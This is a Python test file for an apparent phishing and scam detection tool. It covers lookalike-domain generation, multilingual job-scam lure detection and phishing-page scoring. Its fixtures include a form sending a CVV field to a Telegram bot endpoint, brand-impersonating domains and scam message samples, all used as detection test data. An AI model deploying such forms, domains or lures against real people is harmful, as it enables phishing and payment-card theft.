"""Offline tests for the parts that need no network: generator, similarity, language and lure detection, scoring."""
import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

from rasid import analyzer, generator as g  # noqa: E402
from rasid.lexicon import detect_langs, lure_hits  # noqa: E402
from rasid.sensors.jobs import score_post  # noqa: E402
from rasid.sensors.maps import norm_phone  # noqa: E402


def test_generator_has_homoglyphs_and_punycode():
    c = g.generate("ADCB", "adcb.com")
    techs = {x["technique"] for x in c}
    assert {"cyrillic homoglyph", "homoglyph", "omission", "combosquat", "tld swap"} <= techs
    assert any(x["domain"].startswith("xn--") for x in c)
    assert "adcb.com" not in {x["domain"] for x in c}


def test_event_slugs():
    s = g.slugs("Abu Dhabi Grand Prix")
    assert "abudhabigp" in s and "f1abudhabi" in s


def test_similarity():
    bases = ["adcb", "emiratesnbd", "aramex", "tamm"]
    assert g.similarity("emlratesnbd.com", bases)[0] == 25
    assert g.similarity(g.to_ascii("аdcb.com"), bases)[0] == 25
    assert g.similarity("adcb-secure-verify.top", bases)[0] >= 16
    assert g.similarity("adcb.com-verify.top", bases)[0] >= 16
    assert g.similarity("aramexredelivery.xyz", bases)[0] >= 16
    assert g.similarity("adcbilliardcare.com", bases)[0] < 16   # real pool-cleaning business
    assert g.similarity("abc8.cl", bases)[0] < 16               # one edit from a 4-letter name is weak
    assert g.similarity("google.com", bases)[0] == 0


def test_language_detection():
    assert detect_langs("ابوظہبی میں سیکیورٹی گارڈ کی نوکری") == ["UR"]
    assert detect_langs("مطلوب سائقين في أبوظبي") == ["AR"]
    assert detect_langs("दुबई में ड्राइवर की नौकरी")[0] == "HI"
    assert detect_langs("दुबईमा रोजगारी, भिसा निःशुल्क")[0] == "NE"
    assert detect_langs("ദുബായിൽ ജോലി")[0] == "ML"
    assert detect_langs("Hiring sa Abu Dhabi! Walang experience, bayad lang sa visa")[0] == "TL"
    assert detect_langs("Abu Dhabi mein job, visa free, sirf WhatsApp karein")[0] == "UR-L"


def test_lures_multilingual():
    themes = lambda t: {h["theme"] for h in lure_hits(t)}
    assert "fee for visa or job" in themes("ویزا فیس صرف ۵۰۰ درہم")
    assert "free visa" in themes("ദുബായിൽ ജോലി, വിസ സൗജന്യം")
    assert "free visa" in themes("दुबईमा रोजगारी, भिसा निःशुल्क")
    assert "fee for visa or job" not in themes("दुबईमा रोजगारी, भिसा निःशुल्क")


def test_job_scoring_separates_scam_from_genuine():
    scam, _, info = score_post("Hiring sa Abu Dhabi! Walang experience, bayad lang sa visa processing. WhatsApp 0520004821")
    real, _, _ = score_post("Emirates Group is hiring cabin crew. Apply only through emiratesgroupcareers.com. We never ask for any fee.")
    assert scam >= 50 > real
    assert "520004821" in info["phones"]


def test_phone_normalisation():
    assert norm_phone("+971 52 000 4821") == norm_phone("0520004821") == norm_phone("00971520004821") == "520004821"


def test_score_official_is_zero():
    sc, sig = analyzer.score(25, "x", 1, None, official=True)
    assert sc == 0 and sig[0]["ok"]


# ---------- site inspection & name-only gate (offline) ----------
from rasid import verify  # noqa: E402

W_FAKE = {"name": "ADCB", "official_domains": []}  # no official profile: UI check skipped, others still run


def _page(html, **kw):
    return {"reachable": True, "final_url": "https://adcb-verify.top/", "_html": html, "asks_for": [], "brands_mentioned": [], **kw}


def test_name_alone_never_flags():
    sc, sig = analyzer.score(25, "homoglyph", 2, {"reachable": True, "brands_mentioned": []})
    assert sc <= analyzer.NAME_ONLY_CAP and any(s.get("kind") == "gate" for s in sig)


def test_telegram_form_is_content_evidence():
    html = '<html><body><form action="https://api.telegram.org/bot1:x/sendMessage"><input name="cvv"></form></body></html>'
    r = verify.inspect("adcb-verify.top", _page(html, asks_for=["CVV"], brands_mentioned=["ADCB"]), W_FAKE)
    assert r["links"] and r["verdict"] in ("malicious", "impersonation")
    sc, _ = analyzer.score(18, "combosquat", 2, _page(html, asks_for=["CVV"]), extra=r["signals"])
    assert sc >= 80


def test_unrelated_business_scores_low():
    text = " ".join(["We clean and repair pool tables across Salt Lake City with certified technicians."] * 20)
    r = verify.inspect("adcbilliards.com", _page(f"<html><title>Pool tables</title><body><p>{text}</p></body></html>"), W_FAKE)
    assert r["verdict"] == "unrelated business"
    sc, _ = analyzer.score(18, "combosquat", 900, _page(""), extra=r["signals"])
    assert sc < 20


def test_parked_and_payment_detection():
    assert verify.inspect("x.top", _page("<html><body>This domain is for sale! Buy this domain today.</body></html>"), W_FAKE)["verdict"] == "parked"
    r = verify.inspect("x.top", _page("<html><body>Your fine is due. Pay AED 250 now via bank transfer to AE07 0331 2345 6789 0123 456</body></html>",
                                     brands_mentioned=["ADCB"]), W_FAKE)
    assert r["payment"] and r["verdict"] == "payment capture"


def test_tracker_iframes_are_not_malicious():
    html = ('<html><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-1" height="0" width="0" style="display:none"></iframe></noscript>'
            '<iframe src="https://www.googletagmanager.com/x" width="0" height="0"></iframe></body></html>')
    assert not verify.inspect("shop.com", _page(html), W_FAKE)["code"]


# ---------- RASID's own screenshot comparison (offline, synthetic images) ----------
def _img(path, header, body, box=None):
    from PIL import Image, ImageDraw
    im = Image.new("RGB", (1366, 900), body)
    d = ImageDraw.Draw(im)
    d.rectangle([0, 0, 1366, 90], fill=header)
    d.rectangle([90, 200, 700, 600], fill=(30, 60, 140))
    if box:
        d.rectangle(box, fill=(255, 255, 255))
    im.save(path)
    return path


def test_visual_compare_separates_clone_from_other_site(tmp_path=None):
    import pathlib, tempfile
    from rasid import visual
    d = pathlib.Path(tmp_path or tempfile.mkdtemp())
    off = _img(d / "off.png", (255, 255, 255), (240, 240, 245))
    clone = _img(d / "clone.png", (255, 255, 255), (240, 240, 245), box=(800, 150, 1100, 400))  # same page + injected form
    other = _img(d / "other.png", (200, 30, 30), (20, 20, 20))
    assert visual.compare(clone, off)["score"] >= 0.6
    assert visual.compare(other, off)["score"] < 0.3


def test_blank_screenshot_detected():
    import pathlib, tempfile
    from PIL import Image
    from rasid import visual
    p = pathlib.Path(tempfile.mkdtemp()) / "blank.png"
    Image.new("RGB", (1366, 900), (255, 255, 255)).save(p)
    assert visual.blank(p)


def test_link_check_flags_fake_signin_but_not_the_real_brand():
    from rasid import linkcheck
    form = '<form><input type="email"><input type="password"></form>'
    fake = linkcheck.check("https://instagram-verify.vercel.app/", "https://instagram-verify.vercel.app/", "Instagram", form)
    assert any(s.get("kind") == "content" for s in fake) and sum(s["points"] for s in fake) >= 50
    real = linkcheck.check("https://www.instagram.com/", "https://www.instagram.com/accounts/login/", "Instagram", form)
    assert real == []
    assert linkcheck.no_age_credit("kit.blogspot.com") and not linkcheck.no_age_credit("www.adcb.com")


def test_hosted_demo_starts_from_the_bundled_snapshot(tmp_path, monkeypatch):
    import sqlite3
    from rasid import db
    bundle = tmp_path / "demo"
    (bundle / "shots").mkdir(parents=True)
    sqlite3.connect(bundle / "rasid.db").execute("CREATE TABLE marker (x)").connection.commit()
    (bundle / "shots" / "a.png").write_bytes(b"png")
    monkeypatch.setattr(db, "ROOT", tmp_path)
    monkeypatch.setattr(db, "DATA_DIR", tmp_path / "data")
    monkeypatch.setattr(db, "DB_PATH", tmp_path / "data" / "rasid.db")
    (tmp_path / "data").mkdir()
    db._seed_demo()
    assert (tmp_path / "data" / "shots" / "a.png").exists()
    assert sqlite3.connect(tmp_path / "data" / "rasid.db").execute("SELECT name FROM sqlite_master").fetchone() == ("marker",)
